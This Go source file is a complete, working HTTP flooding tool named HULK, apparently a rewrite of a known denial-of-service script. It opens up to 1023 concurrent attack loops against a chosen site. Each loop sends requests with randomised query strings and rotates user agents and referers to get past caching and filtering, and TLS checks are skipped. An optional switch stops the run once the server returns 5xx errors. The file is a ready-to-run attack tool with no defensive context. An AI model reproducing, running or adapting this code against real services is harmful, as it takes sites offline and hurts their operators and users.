package main

import (
	"bytes"
	"context"
	"crypto/tls"
	"flag"
	"fmt"
	"math/rand"
	"net"
	"net/url"
	"os"
	"os/signal"
	"strconv"
	"strings"
	"sync/atomic"
	"syscall"
	"time"
)

const __version__ = "2.0.0-raw"

const acceptCharset = "ISO-8859-1,utf-8;q=0.7,*;q=0.7"

var (
	safe              bool
	headersReferers   = []string{
		"http://www.google.com/?q=",
		"http://www.usatoday.com/search/results?q=",
		"http://engadget.search.aol.com/search?q=",
	}
	headersUseragents = []string{
		"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3",
		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Vivaldi/1.3.501.6",
		"Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",
		"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",
		"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1",
		"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1",
		"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)",
		"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)",
		"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)",
		"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)",
		"Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)",
		"Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)",
		"Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51",
	}

	sentCounters uint64
	errCounters  uint64
)

type arrayFlags []string

func (i *arrayFlags) String() string {
	return "[" + strings.Join(*i, ",") + "]"
}

func (i *arrayFlags) Set(value string) error {
	*i = append(*i, value)
	return nil
}

func main() {
	os.Exit(run(context.Background(), os.Args[1:], os.Getenv))
}

func run(ctx context.Context, args []string, getenv func(string) string) int {
	var (
		version bool
		site    string
		agents  string
		data    string
		headers arrayFlags
	)

	fs := flag.NewFlagSet("hulk", flag.ContinueOnError)
	fs.BoolVar(&version, "version", false, "print version and exit")
	fs.BoolVar(&safe, "safe", false, "Autoshut after dos.")
	fs.StringVar(&site, "site", "http://localhost", "Destination site.")
	fs.StringVar(&agents, "agents", "", "Get the list of user-agent lines from a file.")
	fs.StringVar(&data, "data", "", "Data to POST. If present hulk will use POST requests instead of GET")
	fs.Var(&headers, "header", "Add headers to the request. Could be used multiple times")
	if err := fs.Parse(args); err != nil {
		return 1
	}

	if version {
		fmt.Println("Hulk", __version__)
		return 0
	}

	u, err := url.Parse(site)
	if err != nil {
		fmt.Println("err parsing url parameter")
		return 1
	}

	t := getenv("HULKMAXPROCS")
	maxproc, err := strconv.Atoi(t)
	if err != nil || maxproc <= 0 {
		maxproc = 1023
	}

	userAgents := headersUseragents
	if agents != "" {
		dataBytes, err := os.ReadFile(agents)
		if err != nil {
			fmt.Printf("can't load User-Agent list from %s\n", agents)
			return 1
		}
		userAgents = []string{}
		for _, a := range strings.Split(string(dataBytes), "\n") {
			if strings.TrimSpace(a) != "" {
				userAgents = append(userAgents, strings.TrimSpace(a))
			}
		}
	}

	var customHeaders []string
	for _, element := range headers {
		parts := strings.SplitN(element, ":", 2)
		if len(parts) == 2 {
			customHeaders = append(customHeaders, strings.TrimSpace(parts[0])+": "+strings.TrimSpace(parts[1]))
		}
	}

	ctx, cancel := context.WithCancel(ctx)
	defer cancel()

	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)
	go func() {
		<-sigChan
		fmt.Println("\n\n-- Interrupted by user --")
		cancel()
	}()

	fmt.Println("-- HULK Attack Started --")
	fmt.Println("           Go!")
	fmt.Println("Max procs        |\tResp OK |\tGot err")

	for i := 0; i < maxproc; i++ {
		go attack(ctx, u, data, customHeaders, userAgents, headersReferers, i, cancel)
	}

	ticker := time.NewTicker(time.Second)
	defer ticker.Stop()

runLoop:
	for {
		select {
		case <-ctx.Done():
			break runLoop
		case <-ticker.C:
			fmt.Printf("\r%-16d |\t%7d |\t%6d", maxproc, atomic.LoadUint64(&sentCounters), atomic.LoadUint64(&errCounters))
		}
	}

	fmt.Printf("\r%-16d |\t%7d |\t%6d\n", maxproc, atomic.LoadUint64(&sentCounters), atomic.LoadUint64(&errCounters))
	fmt.Println("-- HULK Attack Finished --")
	return 0
}

func resolveAddr(siteURL *url.URL) string {
	addr := siteURL.Host
	if strings.Contains(addr, ":") {
		return addr
	}
	if siteURL.Scheme == "https" {
		return addr + ":443"
	}
	return addr + ":80"
}

func extractPathInfo(siteURL *url.URL) (basePath, paramJoiner string) {
	if siteURL.Path == "" {
		basePath = "/"
	} else {
		basePath = siteURL.Path
	}
	if strings.Contains(basePath, "?") || siteURL.RawQuery != "" {
		paramJoiner = "&"
	} else {
		paramJoiner = "?"
	}
	if siteURL.RawQuery != "" {
		if !strings.Contains(basePath, "?") {
			basePath += "?" + siteURL.RawQuery
		} else {
			basePath += "&" + siteURL.RawQuery
		}
	}
	return
}

func attack(ctx context.Context, siteURL *url.URL, postData string, customHeaders, userAgents, referers []string, id int, cancel context.CancelFunc) {
	rng := rand.New(rand.NewSource(time.Now().UnixNano() + int64(id)))
	addr := resolveAddr(siteURL)
	basePath, paramJoiner := extractPathInfo(siteURL)

	dialer := &net.Dialer{Timeout: 5 * time.Second}
	tlsConfig := &tls.Config{InsecureSkipVerify: true}

	reqBuf := bytes.NewBuffer(make([]byte, 0, 1024))
	respBuf := make([]byte, 1024)

	for {
		if ctx.Err() != nil {
			return
		}

		var conn net.Conn
		var err error

		if siteURL.Scheme == "https" {
			conn, err = tls.DialWithDialer(dialer, "tcp", addr, tlsConfig)
		} else {
			conn, err = dialer.DialContext(ctx, "tcp", addr)
		}

		if err != nil {
			atomic.AddUint64(&errCounters, 1)
			time.Sleep(100 * time.Millisecond)
			continue
		}

		for {
			if ctx.Err() != nil {
				conn.Close()
				return
			}

			reqBuf.Reset()
			buildRequest(reqBuf, rng, basePath, paramJoiner, siteURL.Host, postData, customHeaders, userAgents, referers)

			conn.SetWriteDeadline(time.Now().Add(5 * time.Second))
			_, err = conn.Write(reqBuf.Bytes())
			if err != nil {
				atomic.AddUint64(&errCounters, 1)
				break
			}

			conn.SetReadDeadline(time.Now().Add(5 * time.Second))
			n, err := conn.Read(respBuf)
			if err != nil {
				atomic.AddUint64(&errCounters, 1)
				break
			}

			atomic.AddUint64(&sentCounters, 1)

			if safe && detectServerError(string(respBuf[:n])) {
				if cancel != nil {
					cancel()
				}
				return
			}

			if strings.Contains(strings.ToLower(string(respBuf[:n])), "connection: close") {
				break
			}
		}
		conn.Close()
	}
}

func buildblock(rng *rand.Rand, size int) string {
	buf := make([]byte, size)
	for i := range buf {
		buf[i] = byte(rng.Intn(25) + 65)
	}
	return string(buf)
}

func buildRequest(buf *bytes.Buffer, rng *rand.Rand, basePath, paramJoiner, host, postData string, customHeaders, userAgents, referers []string) {
	if postData == "" {
		buf.WriteString("GET ")
		buf.WriteString(basePath)
		buf.WriteString(paramJoiner)
		buf.WriteString(buildblock(rng, rng.Intn(7)+3))
		buf.WriteString("=")
		buf.WriteString(buildblock(rng, rng.Intn(7)+3))
		buf.WriteString(" HTTP/1.1\r\n")
	} else {
		buf.WriteString("POST ")
		buf.WriteString(basePath)
		buf.WriteString(" HTTP/1.1\r\n")
	}

	buf.WriteString("Host: ")
	buf.WriteString(host)
	buf.WriteString("\r\nUser-Agent: ")
	buf.WriteString(userAgents[rng.Intn(len(userAgents))])
	buf.WriteString("\r\nAccept-Charset: ")
	buf.WriteString(acceptCharset)
	buf.WriteString("\r\nReferer: ")
	buf.WriteString(referers[rng.Intn(len(referers))])
	buf.WriteString(buildblock(rng, rng.Intn(5)+5))
	buf.WriteString("\r\nConnection: keep-alive\r\nCache-Control: no-cache\r\n")

	for _, h := range customHeaders {
		buf.WriteString(h)
		buf.WriteString("\r\n")
	}

	if postData != "" {
		buf.WriteString("Content-Length: ")
		buf.WriteString(strconv.Itoa(len(postData)))
		buf.WriteString("\r\n\r\n")
		buf.WriteString(postData)
	} else {
		buf.WriteString("\r\n")
	}
}

func detectServerError(resp string) bool {
	return strings.Contains(resp, "HTTP/1.1 50") || strings.Contains(resp, "HTTP/1.0 50")
}
